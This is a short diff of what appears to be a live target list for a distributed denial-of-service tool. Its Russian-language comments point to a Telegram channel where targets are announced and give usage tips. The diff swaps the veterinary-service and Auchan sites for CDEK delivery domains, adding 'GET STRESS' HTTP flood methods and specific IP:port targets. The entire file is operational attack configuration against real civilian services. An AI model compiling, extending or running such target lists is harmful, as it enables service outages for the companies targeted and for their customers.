@@ -1,8 +1,5 @@
 ### Цели выбираются и анонсируются в канале Украинский Жнец - https://t.me/+-GoGtA_IsOk3YmE6 чат - https://t.me/+sNy3N3b11_9mMDA6
 ### Не забываем, удалять все параметры: -t --rpc -p --debug. UDP в список не добавляем
 
-http://mercury.vetrf.ru/ https://ivis-sso.vetrf.ru http://assol-express.vetrf.ru https://argus.vetrf.ru https://vetrf.ru/ --http-methods GET STRESS
-tcp://62.76.148.81:443 tcp://62.76.145.221:443 tcp://62.76.145.203:443 tcp://62.76.145.81:443
-
-https://www.auchan.ru https://auchan.ru --http-methods GET STRESS
-tcp://46.243.184.43:443 tcp://46.243.184.47:443 tcp://46.243.184.45:443 tcp://194.84.13.19:443
+https://www.cdek.ru/ru https://cdek.by/ru/ --http-methods GET STRESS
+tcp://78.46.28.63:80 tcp://78.46.28.63:443 tcp://195.189.222.41:443 tcp://195.189.222.60:993
